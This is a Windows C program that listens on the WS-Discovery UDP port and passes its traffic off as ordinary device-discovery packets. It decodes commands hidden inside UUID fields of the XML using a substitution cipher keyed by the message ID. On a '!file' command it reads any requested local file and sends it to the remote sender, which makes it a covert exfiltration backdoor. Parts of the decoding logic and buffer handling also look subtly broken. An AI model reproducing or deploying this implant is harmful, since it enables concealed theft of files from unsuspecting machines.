#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <ctype.h>
#include <io.h>
#include <fcntl.h>

#pragma comment(lib, "Ws2_32.lib")

#define PORT 3702  // Standard WSD port
#define BUFFER_SIZE 2048
#define ALPHABET_SIZE 36
#define UUID_LENGTH 36

void error(const char* msg) {
    fprintf(stderr, "%s: %d\n", msg, WSAGetLastError());
    exit(1);
}

void load_cipher_map_from_uuid(const char* uuid, char* cipher_map) {
    int segments[] = { 8, 4, 4, 4, 12 };
    int pos = 0, index = 0;

    for (int i = 0; i < 5; i++) {
        for (int j = 0; j < segments[i]; j++) {
            if (uuid[pos] != '-') {
                cipher_map[index++] = uuid[pos];
            }
            pos++;
        }
        pos++;  // Skip the hyphen
    }
    cipher_map[ALPHABET_SIZE] = '\0';
}

void decode_text(const char* input, const char* cipher_map, char* output) {
    const char* charset = "abcdefghijklmnopqrstuvwxyz0123456789";
    char reverse_map[ALPHABET_SIZE] = { 0 };

    // Build reverse map
    for (int i = 0; i < ALPHABET_SIZE; i++) {
        if (isdigit(cipher_map[i])) {
            reverse_map[cipher_map[i] - '0' + 26] = charset[i];  // Digits start after 26 letters
        }
        else if (isalpha(cipher_map[i])) {
            reverse_map[cipher_map[i] - 'a'] = charset[i];  // Letters are at the start
        }
    }

    // Decode input
    while (*input) {
        if (*input != '-') {  // Skip hyphens
            const char* ptr = strchr(cipher_map, tolower(*input));
            if (ptr) {
                int index = ptr - cipher_map;
                *output = reverse_map[index];
            }
            else {
                *output = *input;  // Copy non-alphabet characters as-is
            }
            output++;
        }
        input++;
    }
    *output = '\0';
}


void extract_uuid(const char* xml_data, char* uuid, const char* start_tag, const char* end_tag) {
    const char* start_ptr = strstr(xml_data, start_tag);
    if (start_ptr) {
        start_ptr += strlen(start_tag);
        const char* end_ptr = strstr(start_ptr, end_tag);
        if (end_ptr) {
            size_t uuid_length = end_ptr - start_ptr;
            strncpy_s(uuid, uuid_length + 1, start_ptr, uuid_length);  // Ensure buffer size and null-termination
            uuid[uuid_length] = '\0';  // Null-terminate the UUID string just in case
        }
        else {
            fprintf(stderr, "End tag not found\n");
        }
    }
    else {
        fprintf(stderr, "Start tag not found\n");
    }
}

// Function to send the contents of a file
void send_file(SOCKET sockfd, const struct sockaddr_in* cliaddr, socklen_t len, const char* file_path) {
    FILE* file;
    errno_t err = fopen_s(&file, file_path, "rb");
    if (err != 0 || file == NULL) {
        perror("Error opening file");
        return;
    }

    char file_buffer[BUFFER_SIZE];
    size_t bytes_read;
    while ((bytes_read = fread(file_buffer, 1, sizeof(file_buffer), file)) > 0) {
        int send_result = sendto(sockfd, file_buffer, (int)bytes_read, 0, (struct sockaddr*)cliaddr, len);
        if (send_result == SOCKET_ERROR) {
            error("Error sending file data");
        }
    }

    printf("File sent successfully: %s\n", file_path);
    fclose(file);
}
int main() {
    WSADATA wsaData;
    SOCKET sockfd;
    struct sockaddr_in servaddr, cliaddr;
    char buffer[BUFFER_SIZE];
    socklen_t len = sizeof(cliaddr);

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        error("WSAStartup failed");
    }

    // Create UDP socket
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) == INVALID_SOCKET) {
        error("Socket creation failed");
    }

    // Set server address
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = INADDR_ANY;
    servaddr.sin_port = htons(PORT);

    // Bind the socket
    if (bind(sockfd, (const struct sockaddr*)&servaddr, sizeof(servaddr)) == SOCKET_ERROR) {
        error("Bind failed");
    }

    printf("Listening for WSD packets on port %d...\n", PORT);

    while (1) {
        int n = recvfrom(sockfd, buffer, BUFFER_SIZE, 0, (struct sockaddr*)&cliaddr, &len);
        if (n == SOCKET_ERROR) {
            error("Receive failed");
        }
        buffer[n] = '\0';  // Null-terminate the received message

        char client_ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &cliaddr.sin_addr, client_ip, INET_ADDRSTRLEN);
        printf("Received packet from %s:%d\n", client_ip, ntohs(cliaddr.sin_port));

        // Extract and decode the message UUID and encoded text
        char message_id[UUID_LENGTH + 1];
        char encoded_uuid[UUID_LENGTH + 1];

        extract_uuid(buffer, message_id, "<wsa:MessageID>urn:uuid:", "</wsa:MessageID>");
        extract_uuid(buffer, encoded_uuid, "<wsa:Address>urn:uuid:", "</wsa:Address>");

        char cipher_map[ALPHABET_SIZE + 1];
        load_cipher_map_from_uuid(message_id, cipher_map);

        char decoded_text[UUID_LENGTH + 1];
        decode_text(encoded_uuid, cipher_map, decoded_text);

        printf("Decoded Text: %s\n", decoded_text);

        // Check if the decoded text contains the "!file" prefix
        if (strncmp(decoded_text, "!file", 5) == 0) {
            // Extract the file path from the message
            char* file_path = decoded_text + 6;  // Skip "!file "
            printf("File transfer requested for: %s\n", file_path);
            send_file(sockfd, &cliaddr, len, file_path);
        }
        else {
            printf("Received message: %s\n", decoded_text);
        }
    }

    // Close socket
    closesocket(sockfd);

    // Cleanup Winsock
    WSACleanup();

    return 0;
}
